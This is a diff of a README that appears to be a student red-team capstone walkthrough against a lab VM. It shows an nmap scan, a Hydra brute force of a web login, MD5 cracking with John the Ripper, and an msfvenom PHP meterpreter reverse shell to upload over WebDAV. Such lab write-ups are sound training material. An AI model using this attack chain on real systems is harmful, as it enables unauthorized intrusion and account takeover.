@@ -17,16 +17,17 @@ Network Diagram:
 
 ## Red Team - Security Assessment
 
-First step is to run a quick network scan
+First step is to run a quick network scan:
 
 '''bash
 nmap -sV -sS 192.168.1.0/24
 '''
 
 The result:
+
 ![nmap scan](https://user-images.githubusercontent.com/90374994/155526909-55aeea1e-7326-4be4-bd6c-db7885ae215a.png)
 
-We can see the Capstone VM (IP: 192.168.1.105) is hosting a web service on Port 80
+We can see the Capstone VM (IP: 192.168.1.105) is hosting a web service on Port 80:
 
 ![Website homepage](https://user-images.githubusercontent.com/90374994/155528219-e5c6bdc1-8175-4647-bd95-6e2ba79c84de.png)
 
@@ -40,13 +41,13 @@ The results show us there are two hidden directories:
   1. http://192.168.1.105/company_folders/secret_folder/
   2. http://192.168.1.105/webdav/
 
-While trying to access the /secret_folder/ directory we are prompted with a warning disclosing the webpage is no longer accessible to the public and a login prompt requesting a username and password.
+While trying to access the /secret_folder/ directory we are prompted with a warning disclosing the webpage is no longer accessible to the public and a login prompt requesting a username and password:
 
 ![secret_folder login](https://user-images.githubusercontent.com/90374994/155529687-3cee176f-441e-4c1c-a5e1-c7746f868931.png)
 
 >NOTE: One clue that is included in the login prompt is "For ashtons eyes only" meaning one of the usernames is potentially "ashton" or "Ashton"
 
-We can try a bruteforcing attack using Hydra and the username "ashton", as well as specifying port 80 and the 'rockyou.txt' wordlist
+We can try a bruteforcing attack using Hydra and the username "ashton", as well as specifying port 80 and the 'rockyou.txt' wordlist:
 
 '''bash
 hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
@@ -60,8 +61,31 @@ Now that we are logged in to the /secret_folder/ there is a file '/connect_to_co
 
 ![personal note](https://user-images.githubusercontent.com/90374994/155532390-3e9e0928-1a5d-4088-a99f-5ab40364a42e.png)
 
+The personal note includes information about how to connect to /webdav/ as well as a hint that the username might be "ryan" or "Ryan" together with an MD5 password hash for the account. 
 
+We can try saving the hash into a file named "hash.txt" and use John the Ripper or a website such as https://crackstation.net/ to try and crack the password.
+For using John the Ripper:
 
+'''bash
+john hash.txt --format=raw-md5 --show
+'''
 
+The result is the password in plain text: linux4u and we can try to login:
+
+![webdav login](https://user-images.githubusercontent.com/90374994/155534746-23c7d436-04d9-4dbd-9c24-46ee76fe3ca8.png)
+
+Now that we can login to the WebDav service we can try and upload malicious content.
+
+![webdav1](https://user-images.githubusercontent.com/90374994/155537659-0e4003d1-0910-4e6e-a7fa-81ee20ae913c.png)
+
+We will try and craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect to the attacker machine, we will need to specify the LHOST as the Kali VM's IP address and the LPORT as 4444:
+
+'''bash
+msfvenom -p php/meterpreter/reverse_tcp -lhost=192.168.1.90 lport=4444 > shell.php
+'''
+
+Now, we can drag and drop the file in the WebDav folder, so we can access it from the web browser:
+
+![webdav2](https://user-images.githubusercontent.com/90374994/155539922-532ce74a-d5c3-498c-8241-f787deb823da.png)
 
 
